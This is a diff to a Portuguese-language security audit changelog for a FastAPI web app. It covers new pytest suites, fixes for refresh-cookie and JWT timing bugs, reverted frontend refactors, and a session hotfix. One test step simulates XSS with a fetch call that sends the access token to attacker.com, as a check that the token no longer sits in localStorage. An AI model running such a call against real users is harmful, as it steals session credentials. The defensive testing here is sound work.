@@ -219,6 +219,28 @@ Range coberto: `26d5574..HEAD` (todos os commits desta fase de auditoria).
 
 ---
 
+## 863007d — test: pytest suite for P0/P1 + 2 bugs found
+
+**Achados**: cobertura pytest dos P0/P1 + correcao de 2 bugs descobertos durante os testes.
+
+**Arquivos**:
+- `tests/__init__.py`, `tests/conftest.py` — infra: SQLite isolado, env vars seguras, TestClient.
+- `tests/test_health.py`, `test_auth_security.py`, `test_rate_limit.py`, `test_email_queue.py` — 17 testes.
+- `app/routers/auth.py` — bug 1 corrigido.
+- `app/security/dependencies.py` — bug 2 corrigido.
+
+**Risco**: medio — toca em auth de novo.
+
+**Bugs corrigidos**:
+
+1. **`/auth/refresh` nao apagava o cookie em falhas**: `response.delete_cookie()` antes de `raise HTTPException` nao funciona (FastAPI descarta a Response e gera nova a partir da excecao). Cookie ficava no browser do atacante. Solucao: helper `_refresh_unauthorized()` injeta `Set-Cookie` no header da propria HTTPException.
+
+2. **`token_is_pre_password_change` tinha falso positivo de ate 1s**: JWT `iat` em segundos vs `password_changed_at` em microsegundos. Login imediatamente apos troca de senha podia disparar logout em loop. Solucao: tolerancia de 2 segundos.
+
+**Como rodar**: `pip install pytest && python -m pytest tests/ -q`. 17 passed.
+
+---
+
 ## 759e64f — fix(security): P1-1 — access token in memory
 
 **Achados**: P1-1 (token sai de localStorage).
@@ -237,6 +259,62 @@ Range coberto: `26d5574..HEAD` (todos os commits desta fase de auditoria).
 4. Abrir nova aba `/verify/{id}` → `window.Auth.hasSessionHint()` → `true` → `ensureToken` → reveal dos dados.
 5. Logout → `Auth.clear()` → sessionStorage limpa, token zerado.
 6. Simular XSS via console: `fetch('https://attacker.com', { body: localStorage.access_token })` → body fica `undefined` (não tem mais lá).
+
+---
+
+## 0ef8e45 — test: business rules smoke (P1-3 + P1-9)
+
+**Achados**: cobertura adicional dos testes pytest.
+
+**Arquivos**: `tests/test_business_rules.py` — novo.
+
+**Risco**: zero (apenas testes).
+
+**Coberto**:
+- P1-9: gestor unavailable sem substituto bloqueia submit; com substituto roteia direto pro substituto.
+- P1-3: duplicate detection no submit + bypass via `confirm_duplicate=true`.
+
+**Como rodar**: `python -m pytest tests/ -q` → 21 passed.
+
+---
+
+## 2b3c105 — refactor(js): split format utilities (Codex) → REVERTED em `d6f0e33`
+
+**Status**: revertido. Causou regressao percebida pelo usuario ("botoes nao clicam").
+Suspeita: combinacao com o split do P2-1 e o token in-memory em F5 antigo gerou um cenario onde a UI parecia morta. Codex reverteu junto ao password.js como hotfix de seguranca. Split sera retomado em fase futura com smoke test runtime obrigatorio.
+
+---
+
+## c6e67aa — refactor(js): split password recovery (Codex) → REVERTED em `d86308b`
+
+**Status**: revertido junto ao 2b3c105 acima.
+
+---
+
+## d6f0e33 + d86308b — Reverts of JS splits (Codex)
+
+**Achados**: hotfix de regressao no frontend.
+
+**Arquivos**: `app/static/js/format.js` e `password.js` removidos; templates voltam a carregar so `app.js`.
+
+**Risco**: zero. Restaura estado funcional pre-split.
+
+---
+
+## 6481bee — hotfix(auth): rescue users logged in before P1-1
+
+**Achados**: regressao de sessao antiga apos P1-1.
+
+**Arquivos**: `app/static/js/app.js` — Auth helper.
+
+**Risco**: baixo. Acrescenta migracao defensiva + aumenta resiliencia do apiFetch.
+
+**O que mudou**:
+1. Auth helper, ao carregar, limpa `localStorage.access_token` legacy (pre-P1-1) e marca `sessionStorage.auth_has_session` se `localStorage.user` existe. Cobre sessoes que estavam logadas antes do deploy do token-in-memory.
+2. `apiFetch` agora sempre chama `Auth.ensureToken()` quando nao tem token, sem depender do hint. Custo: 1 chamada `/refresh` extra para anonimo real; beneficio: cobre cenario onde o hint foi perdido (limpeza de cache, sessao em incognito).
+3. `Auth.setUser()` tambem marca o hint — manter consistencia em todo ciclo.
+
+**Como testar**: usuario que estava logado antes do P1-1 deve, apos hard reload, voltar a clicar nos botoes normalmente.
 
 ---
 
